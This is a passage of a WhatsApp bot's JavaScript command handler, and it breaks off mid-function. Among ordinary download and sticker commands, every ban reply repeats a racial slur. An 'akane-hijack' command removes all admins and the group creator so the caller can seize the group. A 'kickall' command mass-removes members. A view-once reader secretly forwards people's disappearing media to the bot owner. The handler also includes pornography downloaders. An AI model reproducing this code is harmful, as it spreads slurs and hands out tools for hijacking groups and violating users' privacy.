if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins ) return reply('for admins only bro!!')
if (!isBotAdmins) return reply('_Bot must be admin_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rich.groupParticipantsUpdate(m.chat, [users], 'remove')
await reply(`Done`)
}
break;
case 'tagadmin': case 'listadmin': case 'admin':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!isCreator) return m.reply("```for Owner only```.");
    if (!m.isGroup) return reply(mess.group);
    const groupAdmins = participants.filter(p => p.admin)
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
    let text = `   
*Group Admins:*
${listAdmin}
`.trim()
    rich.sendMessage(m.chat, {text : text, mentions: [...groupAdmins.map(v => v.id), owner] }, {quoted: m})
}
break;      
case 'delete': case 'del': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
   if (!isCreator) return reply("```for Owner only```.");
if (!m.quoted) throw false
let { chat, id } = m.quoted
 rich.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break;
            case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': {
            if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot must be admin_')
let response = await rich.groupInviteCode(m.chat)
rich.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break;
 case 'join': {
 if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
 if (!isCreator) return reply("```for Owner only```.");
if (!text) return reply(`example ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await rich.groupAcceptInvite(result)
await reply(`Done`)
}
break;
case 'tag':
case 'totag': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins) return reply('*for admins only bro*')
if (!isBotAdmins) return reply('_Bot must be admin first 🀄_')
               if (!m.quoted) return reply(`Reply message with caption ${prefix + command}`)
               rich.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break;
// case steal sticker
case 'rich': case 'steal': case 'stickerwm': case 'take': case 'wm': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
  const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
	let ahuh = args.join(' ').split('|')
	let satu = ahuh[0] !== '' ? ahuh[0] : `heatless is him`
	let dua = typeof ahuh[1] !== 'AKANE-MD' ? ahuh[1] : `TG_MD`
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = await rich.downloadAndSaveMediaMessage(quoted)
	let jancok = new Sticker(media, {
	pack: satu, // The pack name
	author: dua, // The author name
	type: StickerTypes.FULL, // The sticker type
	categories: ['🤩', '🎉'], // The sticker category
	id: '12345', // The sticker id
	quality: 70, // The quality of the output file
	background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await rich.sendMessage(from,{sticker: nah},{quoted: m})
	await fs.unlinkSync(stok)
	await fs.unlinkSync(media)
}
	break;

case 'couple-pp': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
    try {
        const apiUrl = 'https://apis.davidcyriltech.my.id/couplepp';
        const response = await axios.get(apiUrl);
        const data = response.data;

        if (data.status === 200 && data.success) {
            const maleImageUrl = data.male;
            const femaleImageUrl = data.female;

            const message = {
                text: 'Couple Profile Pictures',
                jpegThumbnail: null // You can set a default thumbnail if needed
            };

            await rich.sendMessage(m.chat, { image: { url: maleImageUrl }, caption: 'Male Image' }, { quoted: mess });
            await rich.sendMessage(m.chat, { image: { url: femaleImageUrl }, caption: 'Female Image' }, { quoted: mess });

        } else {
            reply(`Failed to fetch couple profile pictures: ${data.message || 'Unknown error'}`);
        }
    } catch (error) {
        console.error("Error in couple-pp command:", error);
        reply(`An error occurred while fetching couple profile pictures: ${error.message || 'Unknown error'}`);
    }
    }
    break; 
case 'readmore': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
await rich.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break;
case 'download':
case 'save':
case 'svt': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
  if (!isCreator) return m.reply("```for Owner only```.");
  const quotedMessage = m.msg.contextInfo.quotedMessage;
  if (quotedMessage) {
    if (quotedMessage.imageMessage) {
      let imageCaption = quotedMessage.imageMessage.caption;
      let imageUrl = await rich.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
      rich.sendMessage(botNumber, { image: { url: imageUrl }, caption: imageCaption });
    }
    if (quotedMessage.videoMessage) {
      let videoCaption = quotedMessage.videoMessage.caption;
      let videoUrl = await rich.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
      rich.sendMessage(botNumber, { video: { url: videoUrl }, caption: videoCaption });
    }
  }
}
break;
    case "rizz":
case "pickup-line": {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
  try {
    const apiUrl = `https://apis.davidcyriltech.my.id/pickupline`;
    const response = await axios.get(apiUrl);
    const data = response.data;

    if (data.status === 200 && data.success) {
      const pickupline = data.pickupline;
      await rich.sendMessage(m.chat,
       {
        text: pickupline
      }, { quoted: m }); // Add quoted option for context
    } else {
      reply(`Invalid Response From The API: ${data.message || "Unknown error"}`); // Display specific error message
    }
  } catch (caseError) {
    console.error("An Error Occurred:", caseError);
    reply(`An Error Occurred: ${caseError.message || "Unknown error"}`); // Provide more specific error
  }
  }
  break;
case 'createlogo': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
  if (!text) {
    return m.reply(" Enter the logo title, idea and slogan. Format: .logogen Title|Idea|Slogan");
  }

  const [title, idea, slogan] = text.split("|");

  if (!title || !idea || !slogan) {
    return m.reply(" Incorrect format. Use : .logogen Title|Idea|Slogan\n\n*Example :* .logogen richie|thegoat| always");
  }

  try {
    const payload = {
      ai_icon: [333276, 333279],
      height: 300,
      idea: idea,
      industry_index: "N",
      industry_index_id: "",
      pagesize: 4,
      session_id: "",
      slogan: slogan,
      title: title,
      whiteEdge: 80,
      width: 400
    };

    const { data } = await axios.post("https://www.sologo.ai/v1/api/logo/logo_generate", payload);
    
    if (!data.data.logoList || data.data.logoList.length === 0) {
      return m.reply("Failed to Create Logo");
    }

    const logoUrls = data.data.logoList.map(logo => logo.logo_thumb);
    
    for (const url of logoUrls) {
      await rich.sendMessage(m.chat, { image: { url: url } });
    }
  } catch (error) {
    console.error("Error generating logo:", error);
    await m.reply("Failed to Create Logo");
  }
};
break;

case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!isCreator) return m.reply('```owner only```')
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (!/image/.test(mime)) throw `thrim/Reply Image  Caption ${prefix + command}`
if (/webp/.test(mime)) throw `thrim/Reply Image  Caption ${prefix + command}`
let media = await rich.downloadAndSaveMediaMessage(m)
await rich.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply('done')
}
break;
case 'owner': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
    const kontak = {
        "displayName": 'heatless',
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN: ${global.nama}\nitem1.TEL;waid=${global.owner}:${global.owner}\nitem1.X-ABLabel:\nPlease Don't Spam My Owner\nURL;Email Owner:${global.nama}@gmail.com\nORG: MY OWNER\nEND:VCARD`
    };

    await rich.sendMessage(from, {
        contacts: { contacts: [kontak] },
        contextInfo: {
            forwardingScore: 999, 
            isForwarded: false, 
            mentionedJid: [sender],
            "externalAdReply": {
                "showAdAttribution": true,
                "renderLargerThumbnail": true,
                "title": "TG_MD", 
                "containsAutoReply": true,
                "mediaType": 1, 
                "jpegThumbnail": fs.readFileSync("./rich.jpg"),
                "mediaUrl": "https://cdn.kordai.biz.id/serve/HlEHZd6pgErX.jpg",
                "sourceUrl": "https://whatsapp.com/channel/0029Vb6QmBO3LdQSbKC7F145"
            }
        }
    }, { quoted: m }); 
}
break;
 case 'img':
case 'pinterest': {
    if (isban) return reply('YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
    if (!q.includes("|")) return reply("🀄 *Usage:* `.img <query> | <amount>`\n\n*Example:* `.img Naruto | 5`");

    let [query, amount] = q.split("|").map(t => t.trim());
    amount = parseInt(amount) || 1;

    if (amount > 20) return reply("⚠️ *Amount exceeds the limit!*\n\nMaximum allowed images: *20*");

    try {
        let apiUrl = `https://api-rebix.vercel.app/api/pinterest?q=${encodeURIComponent(query)}&apikey=samuel`;
        let response = await fetch(apiUrl);

        if (!response.ok) {
            console.error(`❌ API Request Failed! Status: ${response.status}`);
            return reply(`⚠️ *Pinterest API Error: ${response.status}*\n\nTry again later.`);
        }

        let data = await response.json();
        console.log("🔍 API Response:", JSON.stringify(data, null, 2));

        if (!data || !Array.isArray(data.result) || data.result.length === 0) {
            return reply(`❌ *No images found for:* *${query}*`);
        }

        let images = data.result.filter(Boolean);
        images = images.sort(() => Math.random() - 0.5);
        let sentCount = 0;

        for (let imageUrl of images) {
            if (sentCount >= amount) break;

            try {
                let checkResponse = await fetch(imageUrl, { method: "HEAD" });
                if (!checkResponse.ok) continue;

                await rich.sendMessage(m.chat, {
                    image: { url: imageUrl },
                    caption: `\`\`\`${query} result\`\`\``
                });

                sentCount++;
                await new Promise(resolve => setTimeout(resolve, 2000));
            } catch (err) {
                console.error("🚨 Image Send Error:", err.message);
                continue;
            }
        }

        if (sentCount === 0) reply("⚠️ *No accessible images found!*");

    } catch (err) {
        console.error("❌ Error in Pinterest case:", err);
        reply(`⚠️ *Pinterest Error: ${err.message}*\n\nPlease try again later.`);
    }
}
break;
case 'checkidch': case 'idch': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!text) return reply("example : link channel")
if (!text.includes("https://whatsapp.com/channel/")) return reply("Link is not valid bro ")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await rich.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Name :* ${res.name}
* *Follower:* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Verified" : "No"}
`
return reply(teks)
}
break;
case 'hd':
  case 'remini':{
  if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!m.quoted) return reply(`Where is the picture?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Photo With caption ${prefix + command}`)
			try {
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			rich.sendMessage(m.chat, { image: proses, caption: `_Success in Making ${command}_`}, { quoted: m})
			} catch {
			  reply('erro bro')
			}
			}
			break;
			
			case 'tiktok':
case 'tt': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
replygc(mess.wait)
await sleep(100);
  if (!text) return reply(`Example: ${prefix + command} link`);
try {
  const data = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(text)}`)
  const vidnya = data.video.noWatermark
  const caption = `*[ TIKTOK DOWNLOADER BY TG_MD ]*

> *Video found* ${data.author.name ?? ''} (@${data.author.unique_id ?? ''})
> *Likes*: ${data.stats.likeCount ?? ''}
> *Comments*: ${data.stats.commentCount ?? ''}
> *Shares*: ${data.stats.shareCount ?? ''}
> *Plays*: ${data.stats.playCount ?? ''}
> *Saves*: ${data.stats.saveCount ?? ''}

> \`Downloader By ${botname}\`
`;
  rich.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m })
} catch {
  const response = await fetchJson(`https://api.tiklydown.eu.org/api/download/v3?url=${encodeURIComponent(text)}`)
  const videoUrl = response.result.video;
  const captionn = `*[ TIKTOK DOWNLOADER ]*

Likes: ${response.result.statistics.likeCount ?? ''}
Comments: ${response.result.statistics.commentCount ?? ''}
Shares: ${response.result.statistics.shareCount ?? ''}
by ${response.result.author.nickname ?? ''}

\`⏤͟͟͞͞ Downloader By ${botname}\`
  `;
  rich.sendMessage(m.chat, { caption: captionn, video: { url: videoUrl } }, { quoted: m })
}

}
break;

case "nwaifu": {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
    const apiUrl = `https://reaperxxxx-anime.hf.space/api/waifu?category=waifu&sfw=true`;
    const response = await axios.get(apiUrl);
    const data = await response.data;
    const imageUrl = data.image_url
    
    await rich.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: "```Your Nwaifu TG_MD```🀄"
      }, { quoted: m }); // Add quoted option for context
      }
      break
    case "rwaifu": {
    if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
    const imageUrl = `https://apis.davidcyriltech.my.id/random/waifu`;
    await rich.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: "```Your Random Waifu by TG_MD🀄```"
      }, { quoted: m }); // Add quoted option for context
      }
      break;
      case 'waifu' :

waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
rich.sendMessage(from, {image: {url:waifudd.data.url},caption:`Your waifu by AKANE MD🀄`}, { quoted:m }).catch(err => {
 return('Error!')
})
break;      
case 'git': case 'gitclone':
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!args[0]) return reply(`Where is the link?\nExample :\n${prefix}${command} https://github.com`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replynano(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    rich.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replynano(mess.error))
break;

       break;
       
       case "kickall":
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!isCreator) return m.reply("```for Owner only```.");
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins) return m.reply(mess.admin)
let users = participants.filter((u) => !areJidsSameUser(u.id, rich.user.id)); 
   let kickedUser = []; 
   for (let user of users) { 
     if (user.id.endsWith("@s.whatsapp.net") && !user.admin) { 
       await kickedUser.push(user.id); 
       await sleep(1 * 1000); 
     } 
   } 
   if (!kickedUser.length >= 1) 
     return m.reply("In this group there are no members except you and me"); 
   const res = await rich.groupParticipantsUpdate(m.chat, kickedUser, "remove"); 
   await sleep(3000); 
   await m.reply( 
     `sucessfully kicked member\n${kickedUser.map( 
       (v) => "@" + v.split("@")[0] 
     )}`, 
     null, 
     { 
       mentions: kickedUser, 
     } 
   ); 
break;
case 'toimg': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return replynano(`_Reply to Any Sticker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await rich.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            rich.sendMessage(m.chat, { image: buffer }, { quoted: m })      
fs.unlinkSync(name)
        })
        
} else return reply(`Please reply to non animated sticker`)
    }
    break;
        
// === CASE HANDLER ===
case 'pollmenu':
  await sendPollButtonMenu(rich, from, m);
  break;

case 'vote1':
  await rich.sendMessage(from, { text: "*You voted: Anime Commands*" }, { quoted: m });
  break;

case 'vote2':
  await sock.sendMessage(from, { text: "*You voted: Games & XP*" }, { quoted: m });
  break;

case 'vote3':
  await sock.sendMessage(from, { text: "*You voted: Anti-Link*" }, { quoted: m });
  break;
  
    case 'setbotpp':
            case 'setpp':
            case 'setpp':
            case 'setppbot':
            if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
                if (!isCreator) return reply("```your not my owner sucker```");
                if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await rich.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await rich.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    reply(m.done)
                } else {
                    var memeg = await rich.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    reply(m.done)
                }
                break;

    case 'coffee': case 'kopi': {
rich.sendMessage(m.chat, {caption: m.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }
            break; 
case 'pickupline': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
try {
    let res = await fetch(`https://api.popcat.xyz/pickuplines`)
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`)
    }
    let json = await res.json()
    let pickupLine = `*YOU GOT RIZZED UP BY TG_MD:*\n\n\`\`\`${json.pickupline}\`\`\``
    reply(pickupLine)
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
  }
  break;
case 'apk':
case 'apkdl': {
  if (!text) return reply(`Example: ${prefix + command} whatsapp`);
  try {
    const res = await fetch(`https://apis.davidcyriltech.my.id/download/apk?text=${encodeURIComponent(text)}`);
    const data = await res.json();
    
    if (!data.success) return reply('APK not found.');

    await rich.sendMessage(m.chat, {
      image: { url: data.thumbnail },
      caption: `*APK Downloader*\n\n` +
               `*Name:* ${data.apk_name}\n` +
               `*Download:* ${data.download_link}\n\n` +
               `>powered by Richie...`
    }, { quoted: m });

    await rich.sendMessage(m.chat, {
      document: { url: data.download_link },
      fileName: `${data.apk_name}.apk`,
      mimetype: 'application/vnd.android.package-archive'
    }, { quoted: m });

  } catch (e) {
    console.error(e);
    reply('Failed to fetch APK. Try again later.');
  }
}
break;


case 'fancy': 
case 'styletext': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
  if (!text) return m.reply(example('Enter Query text!'))
  let anu = await styletext(text)
  let teks = `Style Text From ${text}\n\n`
  for (let i = 0; i < anu.length; i++) {
    teks += `${i + 1}. ${anu[i].name} : ${anu[i].result}\n\n`
  }
  await m.reply(teks)
} 
break;
case "hmp": case "vv2": case "readviewonce2": {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!isCreator) return m.reply("```for Owner only```.");
    if (!m.quoted) {
        return m.reply(`*Reply to an image, video, or audio with the caption ${prefix + command}*`);
    }

    let mime = (m.quoted.msg || m.quoted).mimetype || '';
    try {
        if (/image/.test(mime)) {
            let media = await m.quoted.download();
            await rich.sendMessage(botNumber, {
                image: media,
                caption: " ",
            }, { quoted: m });

        } else if (/video/.test(mime)) {
            let media = await m.quoted.download();
            await rich.sendMessage(botNumber, {
                video: media,
                caption: "",
            }, { quoted: m });

        } else if (/audio/.test(mime)) {
            let media = await m.quoted.download();
            await rich.sendMessage(botNumber, {
                audio: media,
                mimetype: 'audio/mpeg',
                ptt: true // Set to true if you want to send as a voice note
            }, { quoted: m });

        } else {
            m.reply(`❌ Unsupported media type!\nReply to an image, video, or audio with *${prefix + command}*`);
        }
    } catch (err) {
        console.error('Error processing media:', err);
        m.reply(`❌ Failed to process media. Please try again.`);
    }
}
break;  
case 'spotify': {
  if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
  if (!q) {
    return reply('Please provide a song name. Example: `spotify Hannah Montana by Ice Spice`');
  }

  try {
    const searchApiUrl = `https://draculazyx-xyzdrac.hf.space/api/Spotify?q=${encodeURIComponent(q)}`;
    const searchResponse = await axios.get(searchApiUrl);
    const searchData = searchResponse.data;

    if (searchData.STATUS === 200) {
      const songData = searchData.SONG;
      const trackName = songData.title;
      const artistName = songData.artist;
      const albumName = songData.album;
      const releaseDate = songData.release_date;
      const spotifyUrl = songData.spotify_url;
      const coverArt = songData.cover_art;

      const message = `
*Track:* ${trackName}
*Artist:* ${artistName}
*Album:* ${albumName}
*Release Date:* ${releaseDate}
*Spotify URL:* ${spotifyUrl}
`;

      await rich.sendMessage(m.chat, { image: { url: coverArt }, caption: message }, { quoted: m });

      // Spotify Downloader API (Using the track URL from search API)
      if (spotifyUrl) {
        try {
          const downloadApiUrl = `https://apis.davidcyriltech.my.id/spotifydl?url=${encodeURIComponent(spotifyUrl)}`;
          const downloadResponse = await axios.get(downloadApiUrl);
          const downloadData = downloadResponse.data;

          if (downloadData.status === 200 && downloadData.success) {
            const mp3DownloadURL = downloadData.DownloadLink;

            // Send the mp3 download link as an audio file
            await rich.sendMessage(m.chat, {
            audio: { url: mp3DownloadURL },
            mimetype: "audio/mpeg",
            ptt: false // Ensures it's a normal audio file, NOT a voice note
        }, { quoted: m });
          } else {
            reply(`Spotify download failed: ${downloadData.message || 'Unknown error'}`);
          }
        } catch (downloadError) {
          console.error("Error in spotify download:", downloadError);
          reply(`An error occurred while downloading the Spotify track: ${downloadError.message || 'Unknown error'}`);
        }
      } else {
        reply("No Spotify URL found, cannot download the song.");
      }

    } else {
      reply(`Spotify search failed: ${searchData.message || 'Unknown error'}`);
    }
  } catch (error) {
    console.error("Error in spotify command:", error);
    reply(`An error occurred while searching for the Spotify track: ${error.message || 'Unknown error'}`);
  }
  }
  break;
  case "xvideodl": {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!text) return m.reply(example(`xvideo link`))
// Check if link is from xvideo
if (!text.includes("xvideos.com")) return m.reply("Link is not from xvideos.com")
await rich.sendMessage(m.chat, {react: {text: '🀄', key: m.key}})
// Fetching video data from API
try {
let res = await fetch(`https://api.agatz.xyz/api/xvideodown?url=${encodeURIComponent(text)}`);
let json = await res.json();

// Bad response from API
if (json.status !== 200 || !json.data) {
throw "Cannot find video for this URL.";
}

// Retrieving video information from API
let videoData = json.data;

// Download videos using URLs obtained from API
const videoUrl = videoData.url;
const videoResponse = await fetch(videoUrl);

// Check if the video was downloaded successfully
if (!videoResponse.ok) {
throw "Failed to download video.";
}

// Send video
await rich.sendMessage(m.chat, {
video: {
url: videoUrl,
},
caption: `**Title:** ${videoData.title || 'No title'}\n` +
`**Views:** ${videoData.views || 'No view information'}\n` +
`**Votes:** ${videoData.vote || 'No vote information'}\n` +
`**Likes:** ${videoData.like_count || 'No like information'}\n` +
`**Dislikes:** ${videoData.dislike_count || 'No dislike information'}`,
});
await rich.sendMessage(m.chat, {react: {text: '', key: m.key}})
} catch (e) {
console.log(`Error downloading video: ${e}`);
}
}
break;
case 'xvideosearch':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
  if (!text) return m.reply(example(`Milf`))
  try {
    // checking data from api
    let res = await fetch(`https://api.agatz.xyz/api/xvideo?message=${encodeURIComponent(text)}`);
    let json = await res.json();

    // checking api response status
    if (json.status !== 200 || !json.data || json.data.length === 0) {
      throw 'No videos found for this keyword.';
    }

    // fetching search data from api
    let videos = json.data;
    let message = `TG_MD 🀄\nxvideo search result\n\n *"${text}"*:\n`;

    // Composing messages with video information
    videos.forEach(video => {
      message += `Title: ${video.title || 'no name'}\n` +
                 `  Duration: ${video.duration || 'no duration'}\n` +
                 `  URL: ${video.url || 'no URL'}\n` +
                 `  Thumbnail: ${video.thumb || 'no thumbnail'}\n\n`;
    });

    // Sending messages with video lists
    await rich.sendMessage(m.chat, {
      text: message,
    });

  } catch (e) {
    // Handling errors and sending error messages
    await rich.sendMessage(m.chat, `can't fetch result from query`);
  }
}
break;
case 'ss':
case 'ssweb':{
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!text) return reply(`Wheres the link bro 🤔?`)
try {
rich.sendMessage(m.chat, { image: { url: `https://draculazyx-xyzdrac.hf.space/api/Screenshot?url=${encodeURIComponent(text)}` }}, { quoted: m})
			} catch {
	  reply('Yes, there is an error, please report it to the owner so that it can be fixed.')
	}
}
break;
case "profile": 
case "pfp2": {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
const ppUrl = await rich.profilePictureUrl(chat, 'image')
await rich.sendMessage(
    chat, 
    { 
        image: {
            url: ppUrl
        },
        caption: 'Here is the profile picture'
    }
)
await rich.sendMessage(rich.user.id, { text: ppUrl } )
}
break;
case 'antilink': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!isCreator) return m.reply("```for Owner only```.");
    if (!m.isGroup) return reply("This command only works in group chats.");
    if (!isAdmins) return reply("Only group admins can use this command.");
    if (!args[0]) return reply(`Example: ${prefix}antilink on/off`);

    if (args[0].toLowerCase() === 'on') {
        antilinkStatus[m.chat] = true;
        return reply("Antilink is now *enabled* in this group.");
    } else if (args[0].toLowerCase() === 'off') {
        antilinkStatus[m.chat] = false;
        return reply("Antilink is now *disabled* in this group.");
    } else {
        return reply("Use 'on' or 'off' only.");
    }
}
break;

case "deviceid": {
 if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
 
  if (!m.quoted) {
    return m.reply('*Please quote a message to use this command!*');
  }

  try {
    // Get the quoted message
    const quotedMsg = await m.getQuotedMessage();

    if (!quotedMsg) {
      return m.reply('*Could not find the quoted message!*');
    }

    const messageId = quotedMsg.key.id;
    const messageIdLength = messageId.length;

    m.reply(`Device Information:\nMessage ID: ${messageId}\nMessage ID Length: ${messageIdLength}`);
  } catch (err) {
    m.reply('Error retrieving device information: ' + err.message);
  }
}
break;
    
case 'gpt4': case 'openai': case 'xxai': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
  if (!text) return reply(`Ask me anything example ${command} how are yiu `)
async function openai(text, logic) { // Membuat fungsi openai untuk dipanggil
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,  // Sesuaikan token limit jika diperlukan
            "tokenLimit": 8000,  // Sesuaikan token limit untuk model GPT-4
            "completionTokenLimit": 5000,  // Sesuaikan jika diperlukan
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": logic, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    return result;
}

let pei = await openai(text, "")
m.reply(pei)
}
break;
case 'akane-hijack': {
  

  if (!m.isGroup) {
    reply('This command can only be used in groups!');
    return;
  }

  const botNumber = rich.user.id || rich.user.jid.split(':')[0]; // Bot's JID
  const botDeployer = m.sender; // Dynamically use the deployer's JID
  const groupMetadata = await rich.groupMetadata(m.chat);
  const participants = groupMetadata.participants;

  const isAdmins = participants.some(participant => participant.id === m.sender && participant.admin);
  if (!isAdmins) {
    reply('Only group admins can use this command!');
    return;
  }

  const creator = groupMetadata.owner; // Group creator's JID
  const admins = participants.filter(participant => participant.admin === 'admin' || participant.admin === 'superadmin');

  // Avoid removing the bot and deployer's JID
  for (let admin of admins) {
    if (admin.id !== botNumber && admin.id !== botDeployer) { // Exclude bot and deployer
      try {
        await rich.groupParticipantsUpdate(m.chat, [admin.id], 'remove');
        reply(`🔥 Removed admin: @${admin.id.split('@')[0]}`);
      } catch (err) {
        console.log(`Failed to remove admin: ${admin.id}`);
        reply(`Error: Could not remove admin @${admin.id.split('@')[0]}.`);
      }
    }
  }

  // Attempt to remove the group creator (if the creator isn't the bot or deployer)
  if (creator && creator !== botDeployer && creator !== botNumber) { // Exclude bot and deployer
    try {
      await rich.groupParticipantsUpdate(m.chat, [creator], 'remove');
      reply(`🔥 Successfully removed the group creator: @${creator.split('@')[0]}`);
    } catch (error) {
      console.error(`Error removing group creator: ${error}`);
      reply('⚠️ Could not remove the creator. Restricting their activity instead.');

      // Restrict messages for the creator
      try {
